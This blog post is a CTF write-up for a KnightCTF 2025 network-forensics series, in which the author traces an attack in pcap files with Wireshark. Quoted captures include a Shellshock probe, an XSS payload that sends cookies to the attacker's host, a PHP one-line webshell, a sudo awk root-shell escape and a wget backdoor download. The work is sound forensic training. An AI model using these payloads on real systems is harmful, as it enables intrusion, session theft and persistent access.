---
title: "All Networks"
description: "All multi-part networks challenges for KnightCTF"
pubDate: 2025-01-22
ctf: "KnightCTF 2025"
category: "networks"
author: "sealldev"
section: "CTFs"
image: "images/25-knight/icon.png"
---



All of these challenges were done with Wireshark.

### Initial Reconnaissance (capture1.pcapng)

> Find the basic web enumeration tool that is used by the attacker.

> First solved by my teammate Ch1maera!

We need to find the tool that was being used for network enumeration.

Considering there is `http` traffic, we can automate this task with tshark to pull all the User Agents.

```
$ tshark -r ~/Downloads/capture1.pcapng -Y "http.user_agent" -T fields -e http.user_agent | sort | uniq
() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;
Google Chrome/128.0.6613.84 Linux
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Pamac/11.6.4_manjaro
```

There is a CVE header, looking it up on Google is a link to nikto on [GitHub](https://github.com/sullo/nikto/blob/master/program/plugins/nikto_shellshock.plugin) for ShellShock.

Flag: `KCTF{nikto}`

### Server & Attacker IP (capture1.pcapng)

> In this challenge, I've crafted a series of intricate scenarios that will test your investigative skills. You'll dive into a network of secrets, uncover hidden identities, and piece together the story of a complex cyber attack. Each step requires careful analysis and keen observation. There are total 17 challenges & 3 pcap files in this category. The files will be provided accordingly. The answers are there, but they won't come easily—you'll need to think like an attacker and act like a detective. Get ready to unravel the mystery and prove your prowess in this thrilling journey.

> What are the server & attacker IPs?

> Flag Format: KCTF{127.0.0.1_0.0.0.0}

Working with a `capture1.pcapng` and will in all the following challenges (until `capture2.pcapng`), it is a large PCAP. I initially filter by `http` and see some requests to a `/register` endpoint from `192.168.1.9` to `192.168.1.10`.

Therefore, `.10` is likely the server as it's sending the response to the HTTP request.

Flag: `KCTF{192.168.1.10_192.168.1.9}`

### The Real Admin (capture1.pcapng)

> Can you identify the real admin's ip?

> Flag Format: KCTF{127.0.0.1}

We need to identify _real_ admin traffic (as it looks like the attacker compromises the admin account).

Filtering by `http && ip.addr != 192.168.1.9`.

![realadminwireshark.png](images/25-knight/realadminwireshark.png)

We can see communication with `192.168.1.3`.

Flag: `KCTF{192.168.1.3}`

### The Intruder's Identity (capture1.pcapng)

> The attacker has gained access. Can you find out the username and password he used?

> Flag Format: KCTF{username_password}

We need to find the username and password for the intruder.

Looking for `http` traffic to a `/register` endpoint with a POST for the registration: `http.request.uri == "/register" && http.request.method == "POST"`

```
POST /register HTTP/1.1
Host: 192.168.1.10
Connection: keep-alive
Content-Length: 188
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.10
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.10/register
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,la;q=0.8
Cookie: XSRF-TOKEN=eyJpdiI6IkFVVnB5a1k3cW00dm14SlBpbUZic1E9PSIsInZhbHVlIjoiR0ptRDBWdnhjaE1OTllobTZsTkpxd1JrRlpNVHRmZER2dnloSG1pQlNMQmM4OHI4a0NWeXVCWmtEdUhIWmFnZmRrOHBnMUJlSWlIeko0YkJDMERuekNvRFVuZFd2WWNtMUN3U2JDOVIzNmkvazZEbFVnSVFjSXlmMG1DcVljZ3QiLCJtYWMiOiI5MTUyZmEyMWExYjk0YTA3ZTFhZjA5MWU1OTAwYTA0MGJiNGE3N2VjNzlmYzdkYzdlMDEyZTJjNjkzM2UyYmNkIiwidGFnIjoiIn0%3D; knightblog_session=eyJpdiI6ImI0QWlMN2VyMmIxRS90WXRBSU1DSnc9PSIsInZhbHVlIjoiY0RsQmU0WlVRZWVIa0Y3T1R5K1VsVUJRMW9FMCs5WGtlVWtJSlRKOTZjWHE2VWlBN0luQnUwNVRPN0pFODlCd0Z4M2g0SDVSUFdlZVVSdmNTOWpGWUZKKzNCOWIvWE94aGtDRmZtUU9DSmRYM2RkSUFJSHAvQWREY3F4VFhFa0EiLCJtYWMiOiJiNmFhOWYyZDUwYWIzN2ZhYjFmZWQwMjcyNjVhMTliY2YzZWY3ZTU3ZDkwMjNiNDk3YWEwOGVmODRlNmRmYjc4IiwidGFnIjoiIn0%3D

_token=pLDuHThQ1RGo8gXsm7ZHtxYLr66KDMWMXJEt8GEa&name=TheExploiter&username=theexploiter&email=theexploiter%40knightblog.com&password=exploiter%40test&password_confirmation=exploiter%40test
```

Flag: `KCTF{theexploiter_exploiter@test}`

### Compromising the Admin (capture1.pcapng)

> The attacker managed to compromise the admin's credentials. Identify the admin's email and password.

> Flag Format: KCTF{email_password}

We need the admin's credentials.

I filter for HTTP traffic containing `login` in the request URI: `http && http.request.uri contains "login"`

![compromisingtheadmin.png](images/25-knight/compromisingtheadmin.png)

Looking at the `/admin/login` is the URI for an admin login.

I then filter to the attacker IP and the `/admin/login` URI: `http.request.uri == "/admin/login" && ip.addr == 192.168.1.9`

```
POST /admin/login HTTP/1.1
Host: 192.168.1.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: http://192.168.1.10
Connection: close
Referer: http://192.168.1.10/admin/login
Cookie: XSRF-TOKEN=eyJpdiI6ImMrWGpNOTY5UkxKYlJtdEpwK1hoVHc9PSIsInZhbHVlIjoiMVAyOHNqdVZHemxEWDdDMXAyT3lnWkVMeHVYZVJ1YXp1Qk90bnVJWW1lalVNVXBtR3dPQW84ZkJLeHUyalFOcUlRazUxTGQrVFBISTdwUTU1ejFsYU1aVW9LQzRFS1NZRTF5MWYyRHpQOTNXaHNEWng1NzBmamprVElCNEtXcVIiLCJtYWMiOiI4ZTdiMTVlYWE3MzM4YTViMjRiOGIzN2ZlMGU2MGUzYjgxMDFhNmYzNGMyZjk2ZjZlMDEwNmZjNmMzNTViYjFlIiwidGFnIjoiIn0%3D; knightblog_session=eyJpdiI6ImJvNElOQVBTWkh2bStWdkNvb0FSaUE9PSIsInZhbHVlIjoicTNNbCtWa3F2NU5mNTJUTkdDUHduNVFuMWNEbmJyUWR4aGtCR292ZXhwUU56V1hzZXJmYmRkcXhKQkd5aWU0VE0zODFyQ2RiRHNFWkdwS00vb2t0bzlmbE9IazlvSkRoME1BKy9TSDVaM1Q4QU52UHF6b056ZVYwQTZaLzFINnMiLCJtYWMiOiJmNGYwNjVjZDJlZDFjMGM4OWZiN2U2ZWRmOGUxM2ZhODU4ZmYzMDVmMWUxNDFlNDMwZmU2MjlhNDI0ZGZjNDU5IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i

_token=aW2w8Ol9Yxf6CyS1BFZltbezpwXBlSUydsNWXBjT&email=admin%40example.com&password=admin
```

Flag: `KCTF{admin@example.com_password}`

### Stealing the Sweet (capture1.pcapng)

> The attacker utilized a port to steal admin cookies somehow. Can you determine the port & method used for this malicious act?

> Flag Format: KCTF{port_method}

We need to figure out how the attacker got the admin access, what attack they used and what port was used for the attack,

From the name of the challenge and the fact they used a port I am thinking theft of cookies via XSS.

I filter for attacker IP traffic, if a frame contains `document.cookie` which stores the cookies in JS and if it's HTTP traffic: `frame contains "document.cookie" && http && ip.addr == 192.168.1.9`

The first request is a POST to `/blog/create`

```
POST /blog/create HTTP/1.1
Host: 192.168.1.10
Connection: keep-alive
Content-Length: 674
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygktK0rAB0kja0dvn
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.10/blog/create
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,la;q=0.8
Cookie: XSRF-TOKEN=eyJpdiI6Imo4ekVFdHdhdzFXZG9tdmlJN09ETFE9PSIsInZhbHVlIjoiazZWMWxBSDljZW51RTNSdm4xQXhNRXhubzBjR3FCQXU2U0lhWkdtZkhyWUVMTVJUS0pTNHlJaXRzY0dRTmlxRlN0YkE4SlQ0NkdWV0V2SXJISmRvVFFmc0FIbFJrVXBSdGdJQjFFbitYVXdVVFFRa3Rkamppd1RNUjdEd3d4Q1UiLCJtYWMiOiIwN2VlNzcyNjMwYjYwN2I5MDAyNzM3NGIxN2ZmYWU1OTNiNWNmYzNmMzE5YjY2MjMzNDZlZjllNWU5OGM1NWU0IiwidGFnIjoiIn0%3D; knightblog_session=eyJpdiI6ImVKbGQ5NEtDMmg2eVBOTExmcDVjRGc9PSIsInZhbHVlIjoiOXZKSjBGdTdRRDNoK29wRExJOFE2YkI0TEs2MDROZS9IbWVpTldZdU0rR2MyREZvMU5ObW81V09pZk1RNDZQRlF5NUREZC82NWhGWnpDa21wUUhtNWdJRk5CUms5SG83MmUwT3RBYzBEbm5aY3U0dDJPYnZYWWZwQjNLL0Z5WHkiLCJtYWMiOiIyZjhmNThlNjM2NDEwOTNkZjFjNWUwZGFlMTA1ZWY4YjljNWM2NWRhM2E0YjkyYzI1YTNiODlmNTNiYmQ3MTZmIiwidGFnIjoiIn0%3D

------WebKitFormBoundarygktK0rAB0kja0dvn
Content-Disposition: form-data; name="_token"

pLDuHThQ1RGo8gXsm7ZHtxYLr66KDMWMXJEt8GEa
------WebKitFormBoundarygktK0rAB0kja0dvn
Content-Disposition: form-data; name="title"

Bitcoin is growing rapidly
------WebKitFormBoundarygktK0rAB0kja0dvn
Content-Disposition: form-data; name="content"

Bitcoin is growing rapidly. I wish I had some of them

<script>var i=new Image; i.src="http://192.168.1.9:8881/?"+document.cookie;</script>
------WebKitFormBoundarygktK0rAB0kja0dvn
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarygktK0rAB0kja0dvn--
```

We can see XSS is being used and to port 8881.

Flag: `KCTF{8881_xss}`

### Malicious Uploads (capture1.pcapng)

> A reverse shell was uploaded by the attacker. What is the name of this file?

> Flag Format: KCTF{filename.ext}

We need to find the original name of the maliciously uploaded file.

I filter for attacker traffic, if the frame contains `.php` (which I infer it's likely a webshell from seeing other suspicious php files in the traffic) and for HTTP: `ip.addr == 192.168.1.9 && frame contains ".php" && http`

![maliciousupload.png](images/25-knight/maliciousupload.png)

There is a `/blog/create` POST which we've seen is likely exploitable (as it was with XSS)

```
POST /blog/create HTTP/1.1
Host: 192.168.1.10
Connection: keep-alive
Content-Length: 776
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryI8t14aG00RXkrSJu
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.10/blog/create
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,la;q=0.8
Cookie: XSRF-TOKEN=eyJpdiI6ImJUejNlZmlNSzZ4bC9KMGR5dTJ3K3c9PSIsInZhbHVlIjoicnVPbThwanBCTWZSZVVVMlpMWHJLUXk0MkwrM09CT3AzRU9NN2JpZnV4aTllZWdZU2RWOVVuZXd3MVRFdW90YU9tM1dGdXQ2SFhSdGg3TnJrN210Y2lHN3JSS3M3WkpDK0lPcFhWSVhEd2dWRGcvWEhSMnQvMDR2eE1LSUpQamQiLCJtYWMiOiI0ZmQ0MWJmYmJmZDVmMDhjZDI1ZTEyNmE4NDdjZWNiMGRmYjVkYWQ0OTExZDYwYWM5ZDM4ZDE5NTFmM2IxMzdjIiwidGFnIjoiIn0%3D; knightblog_session=eyJpdiI6IjQvVm5IZDgrSDhOVGlEZkx4Z1V2alE9PSIsInZhbHVlIjoiNEQxcDd2NndITTZ5czBDSVFETkdGMHhJVGxPQ3NMYmVTMmJFWVJ1OW5EUVI3VE00a1M1N01YSnM1MjJRSXE4VFV5THJWZGw4MHF4TE9aTXZEbmtRSXo3QU5rbm02U3lQVFRiZlR2K0NNZGZ4T2FSY01YMDZEVklhYmFCeHZjL1giLCJtYWMiOiJhOWNiN2Q3ZmVhNDk3Y2U3NzA4MzM4NGZkMGQ5ZGEwMmRkMmM5MGU3OWY1YWM5M2RiNTViNDBlOTg5NTdkZjE3IiwidGFnIjoiIn0%3D

------WebKitFormBoundaryI8t14aG00RXkrSJu
Content-Disposition: form-data; name="_token"

pLDuHThQ1RGo8gXsm7ZHtxYLr66KDMWMXJEt8GEa
------WebKitFormBoundaryI8t14aG00RXkrSJu
Content-Disposition: form-data; name="title"

First blog
------WebKitFormBoundaryI8t14aG00RXkrSJu
Content-Disposition: form-data; name="content"

first blog
------WebKitFormBoundaryI8t14aG00RXkrSJu
Content-Disposition: form-data; name="file"; filename="serverfile.php"
Content-Type: application/x-php

<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
------WebKitFormBoundaryI8t14aG00RXkrSJu--
```

The file is called `serverfile.php`!

Flag: `KCTF{serverfile.php}`

### Shell History (capture1.pcapng)

> Before the recent attack, another shell file was already present in the server. Find its name and the date it was used.

> Flag Format: KCTF{filename.ext_Feb_7}

Previously there was another malicious file uploaded. Find it's name as well as the day and month it was uploaded.

Considering the name of the challenge talks about a shell, the attacker likely did an `ls` which had the `-l` flag to display the date and other information.

The webshell in the previous challenge uses the `cmd` parameter. I setup a filter for HTTP traffic containing `cmd` in the request URI: `http && http.request.uri contains "cmd"`

![shellhistory.png](images/25-knight/shellhistory.png)

There is a `ls -la` which has the following:

```
GET /uploads/678e2443a6725.php?cmd=ls%20-la HTTP/1.1
Host: 192.168.1.10
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,la;q=0.8
Cookie: XSRF-TOKEN=eyJpdiI6ImVpaFRpaHM0VHM3WVdTc1R6S3pLU2c9PSIsInZhbHVlIjoidTM2ZjJPeW5lMU9SOVMrRllkK1NJK1BiTTg3RDMrYmIzRDZPbkxWamhPWTRvOVh3TWdaQ21haEdmVmFzY3dSS2xiV3BhUmFXTVdXL2tpYVZyZ2hNV09OYnN6dVMwcHp6QXBBUjhielQwNnZudUtqaXVZQmxTd0pXeS9FTytlQWQiLCJtYWMiOiI3ZjZhOTJjNjdmNGRiMTYxNjcwZWFhMDE4MmE1ZDNmMDczNDE2MmFhZWQ1Mjk0MDMwNDU3YjViNTFkODM0ZjA5IiwidGFnIjoiIn0%3D; knightblog_session=eyJpdiI6IjRHZVk2cVhiaXRycFgwQVVxWjh0VHc9PSIsInZhbHVlIjoicXE5bEVab3NXbldmczlpd04yaGEwY25LZ2twT3ZyallBdW5DR0Evc3UyM3lYYWhwOU40VGsvV2VNeUR6RFdhRmJ0b0JXZEJyUjd4Ly9tL04yMWpFRG5sNzVhWjM2T0p2Um5xamVRSytrT1BFb094cE1Lc1VmM2EzVCtaZEhMOU4iLCJtYWMiOiJkN2UzNmNlZjFlOTA5NjUwZDkwODJhNGU0ODA5M2FhYjM3NmRkYTYxMTFmZmNhMTZmMGIyYWM3ZmRkZmVlNTkyIiwidGFnIjoiIn0%3D

HTTP/1.1 200 OK
Date: Mon, 20 Jan 2025 10:24:47 GMT
Server: Apache/2.4.62 (Rocky Linux)
X-Powered-By: PHP/8.2.27
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
<pre>total 800
drwxr-xr-x. 2 apache apache   4096 Jan 20 16:24 .
drwxr-xr-x. 5 apache apache    120 Jan 19 17:34 ..
-rw-r--r--. 1 apache apache   5491 Jan 19 00:15 678befa776435.php
-rw-r--r--. 1 apache apache 111415 Jan 19 15:57 678ccc6eb27ff.jpeg
-rw-r--r--. 1 apache apache 225240 Jan 19 16:09 678ccf6614432.jpg
-rw-r--r--. 1 apache apache 225240 Jan 19 16:11 678ccfce06773.jpg
-rw-r--r--. 1 apache apache 111415 Jan 19 19:59 678d05534496e.jpeg
-rw-r--r--. 1 apache apache 111415 Jan 20 16:04 678e1fb3b6484.jpeg
-rw-r--r--. 1 apache apache    242 Jan 20 16:24 678e2443a6725.php
-rw-r--r--. 1 apache apache   5491 Jan 19 00:12 php-reverse-shell.php
</pre>
```

Flag: `KCTF{php-reverse-shell.php_Jan_19}`

### The Overseer (capture2.pcapng)

> What is the web-based server management tool that is used here?

We now have a new capture, `capture2.pcapng`.

We are tasked to find the authentication bruteforce and to what endpoint it was on.

Filtering by just `http` we can see a lot of Authentication Failed to `/cockpit` and other web traffic to `/cockpit/*`.

![overseer.png](images/25-knight/overseer.png)

Cockpit is a [server management tool](https://cockpit-project.org/).

Flag: `KCTF{cockpit}`

### The Gatekeeper (capture2.pcapng)

> On which port does the web-based server management system is working?

We just need to look at a `/cockpit` request and see the port the request is sent to, which is port `9090`

Flag: `KCTF{9090}`

### The Server's Identity (capture2.pcapng)

> Find the **hostname** of the server.

> First solved by my teammate Ch1maera!

We can search the PCAP for frames containing `hostname` (`frame contains "hostname"`) and see if there is any information:

![serveridentitypackets.png](images/25-knight/serveridentitypackets.png)

I find this in a TCP stream of the packets listed:

```
<script>
var environment = {"is_cockpit_client":false,"page":{"connect":true,"require_host":false,"allow_multihost":true},"logged_into":[],"hostname":"localhost.localdomain","os-release":{"NAME":"Rocky Linux","ID":"rocky","PRETTY_NAME":"Rocky Linux 9.5 (Blue Onyx)","CPE_NAME":"cpe:/o:rocky:rocky:9::baseos","ID_LIKE":"rhel centos fedora"},"CACertUrl":"/ca.cer"};
    </script>
```

It has a key-value pair:

```
"hostname":"localhost.localdomain"
```

Flag: `localhost.localdomain`

### Tareq's Secret (capture2.pcapng)

> First solved by my teammate Ch1maera!

We need to find their password.

Likely it is going to be in a `login` request, but we want the response for only successful authentications. Let's look with a filter for HTTP responses where the request URI contains `login`: `http.response_for.uri contains "login"`.

![tareqssecretcap.png](images/25-knight/tareqssecretcap.png)

Following the HTTP stream of the only request with a `200` we get this:

```
GET /cockpit/login HTTP/1.1
Host: 192.168.1.10:9090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic dGFyZXE6U2VjdXJlUGFzcw==
X-Superuser: none
Connection: keep-alive
Cookie: XSRF-TOKEN=eyJpdiI6ImNzdjBkSnBBYmQrcGZVSVI3WHNYN1E9PSIsInZhbHVlIjoiRWtwWDgva1pPYVZXSHZ2Qmt2cmN6aW5TRWdlcFpyYStraVQ5YjFsbzg1aXBSL3FuT0UwSy9MV3J5cnNGbUl3U0FFUGFNZjBqcXYydTVrZWNjNmxrbXJ0RGRoV2JpRTd3VlJSWW9oOS8wR2M2eXpuSUdicmprZkxaMnh2bzRLZk4iLCJtYWMiOiIwMGQ5Yzg0ODI3MjNhMjkxYjA3MWM1NjYxZDMxZWExN2I4OGFmYjk2ODlkZTQ3ZjBiZjAxZmI5YTU4Y2NjOThmIiwidGFnIjoiIn0%3D; knightblog_session=eyJpdiI6Ii9RZGJTTit4S3JjdndMZmJKS3dNN2c9PSIsInZhbHVlIjoiYXRmYm15NWt2ZzR1eXRIakk5WWhOVEFEbHYvZ2VWQ0ZFZTVMTGRQQkxxL1VpSnpNS3pvb0VrNmtzdEh5aWlnaWRhQzd5dEIrMi9vbW1USjVCejBsUFllWmlsUVJ4VDdSS1k1cjFRT1hCL2NQMUw4bXg2eDNFMXVFTHZLUDBTMUEiLCJtYWMiOiIxNWMwYzk2NjY2YzQ3YzkzY2Y5OTQyMjFkMDc4NDE4ZTg2NzJmN2ZlZmMzNTZlNGQ4OTQzMmQyZGY2ZjEzMzQ3IiwidGFnIjoiIn0%3D; cockpit=deleted
Priority: u=0

HTTP/1.1 200 OK
WWW-Authenticate: *
Content-Type: application/json
Set-Cookie: cockpit=dj0yO2s9MjI4M2ExZTRiMzU0ZjgxZTBjOTI1Njg1OGZlNmM1Y2UyNTNiMzE5YjQxYWQxOGI3M2JjYWMzMTE1NDE1ZmNhZQ==; Path=/; SameSite=Strict; HttpOnly
Content-Length: 81
Cache-Control: no-cache, no-store
X-DNS-Prefetch-Control: off
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
Cross-Origin-Resource-Policy: same-origin
X-Frame-Options: sameorigin

{"csrf-token":"ab51103f2ba56bd86ef51420ec76b9150b86fe198aadf6d6d684af1995fa0f65"}
```

Inside the `Authorization` header is a Base64 string that decodes to `tareq:SecurePass`.

Flag: `KCTF{SecurePass}`

### The Escalation Trick (capture3.pcapng)

We need to find how the user tried to escalate their privileges (and failed to)

Generally when investigating command execution attackers **immediately** run `whoami` to check their user, so we can filter for frames containing that with `frame contains "whoami"`:
![escalationtrick.png](images/25-knight/escalationtrick.png)

The first 2 packets are nothing of interest while the next one (following the TCP stream) has a lot more data!

![tcpstreamnetworks.png](images/25-knight/tcpstreamnetworks.png)

Looking more at the commands (17th TCP Stream) the user executes we can see they try to use `awk` as it's in `sudo -l`:

```bash
[tareq@localhost uploads]$ sudo -l
sudo -l
Matching Defaults entries for tareq on localhost:

    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,

    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",

    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",

    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",

    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",

    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",

    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin



User tareq may run the following commands on localhost:

    (ALL) NOPASSWD: /usr/bin/awk

[tareq@localhost uploads]$ sudo awk 'BEGIN {system("/bin/sh")}'
sudo awk 'BEGIN {system("/bin/sh")}'
```

Flag: `KCTF{awk}`

### The Hidden Door (capture3.pcapng)

We need to find where the backdoor was stored and what port it was retrieved from.

Continuing to look through the 17th TCP Stream, there is some suspicious activity:

```bash
sh-5.1# cd /root
cd /root
sh-5.1# ls
ls
anaconda-ks.cfg
sh-5.1# mkdir .sys
mkdir .sys
sh-5.1# ls
ls
anaconda-ks.cfg
sh-5.1# ls -la
ls -la
total 48
dr-xr-x---.  5 root root 4096 Jan 20 16:48 .
dr-xr-xr-x. 18 root root  235 Jan 19 17:39 ..
-rw-------.  1 root root 1001 Jan 19 17:45 anaconda-ks.cfg
-rw-------.  1 root root 1126 Jan 20 15:46 .bash_history
-rw-r--r--.  1 root root   18 May 11  2022 .bash_logout
-rw-r--r--.  1 root root  141 May 11  2022 .bash_profile
-rw-r--r--.  1 root root  429 May 11  2022 .bashrc
drwxr-xr-x.  3 root root   22 Jan 19 18:41 .config
-rw-r--r--.  1 root root  100 May 11  2022 .cshrc
-rw-------.  1 root root   20 Jan 20 15:33 .lesshst
-rw-------.  1 root root  169 Jan 19 19:11 .mysql_history
drwx------.  2 root root    6 Jan 19 17:39 .ssh
drwxr-xr-x.  2 root root    6 Jan 20 16:48 .sys
-rw-r--r--.  1 root root  129 May 11  2022 .tcshrc
-rw-------.  1 root root 4665 Jan 20 15:25 .viminfo
sh-5.1# cd .sys
cd .sys
sh-5.1# wget http://192.168.1.9:2081/sys
wget http://192.168.1.9:2081/sys
--2025-01-20 16:50:22--  http://192.168.1.9:2081/sys
Connecting to 192.168.1.9:2081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16664 (16K) [application/octet-stream]
Saving to: ...sys...


sys                   0%[                    ]       0  --.-KB/s
sys                 100%[===================>]  16.27K  --.-KB/s    in 0s

2025-01-20 16:50:22 (275 MB/s) - ...sys... saved [16664/16664]
```

`sys` is being stored at `/root/.sys/sys` and the port is `2081`

Flag: `KCTF{/root/.sys/sys_2081}`

### Port Fiesta (capture3.pcapng)

We need to find how many ports the backdoor opens.

We see the server is initialised with several ports:

```bash
sh-5.1# ./sys &
./sys &
[1] 7364
sh-5.1# Server started on port 12342
Server started on port 12344
Server started on port 12341
Server started on port 12343
Server started on port 12345
Server started on port 12340
Server started on port 12347
Server started on port 12346
Server started on port 12349
Server started on port 12348
```

It's active on 10 ports.

Flag: `KCTF{10}`

### The Backdoor's Whipser (capture3.pcapng)

We need to find what port the backdoor is active on.

We can use the ports from the previous challenge to find the traffic.

I use Wireshark to iterate through the ports with filter `tcp.port == 1234x` and find traffic on port `12345` (go figure):
![portfiestatraffic.png](images/25-knight/portfiestatraffic.png)

Following the stream we can see a `whoami`:

```
whoami
Connected! If this is the right port, you can execute commands.
Command> root
Command>
```

Flag: `KCTF{12345}`

### The Unused Tool (capture3.pcapng)

Going back to the commands the user executes, we can see they try to install `tmux` and fail to use it (omegaLUL):

```bash
sh-5.1# which tmux
which tmux
which: no tmux in (/sbin:/bin:/usr/sbin:/usr/bin)
sh-5.1# dnf install tmux
dnf install tmux
Last metadata expiration check: 1:49:32 ago on Mon 20 Jan 2025 03:02:13 PM +06.
Dependencies resolved.
================================================================================
 Package        Architecture     Version                 Repository        Size
================================================================================
Installing:
 tmux           x86_64           3.2a-5.el9              baseos           475 k

Transaction Summary
================================================================================
Install  1 Package

Total download size: 475 k
Installed size: 1.1 M
Is this ok [y/N]: y
y
Downloading Packages:
                         [===                 ] ---  B/s |   0  B     --:-- ETA
...
tmux-3.2a-5.el9.x86_ 30% [======              ] 204 kB/s | 144 kB     00:01 ETA
tmux-3.2a-5.el9.x86_64.rpm                      203 kB/s | 475 kB     00:02
--------------------------------------------------------------------------------
Total                                           141 kB/s | 475 kB     00:03
Running transaction check
Transaction check succeeded.
Running transaction test
Transaction test succeeded.
Running transaction

  Preparing        :                                                        1/1

  Installing       : tmux-3.2a-5.el9.x86_64 [                             ] 1/1
...
  Installing       : tmux-3.2a-5.el9.x86_64                                 1/1

  Running scriptlet: tmux-3.2a-5.el9.x86_64                                 1/1

  Verifying        : tmux-3.2a-5.el9.x86_64                                 1/1

Installed:
  tmux-3.2a-5.el9.x86_64

Complete!
sh-5.1# tmux new -s sys
tmux new -s sys
missing or unsuitable terminal: unknown
```

Flag: `KCTF{tmux}`
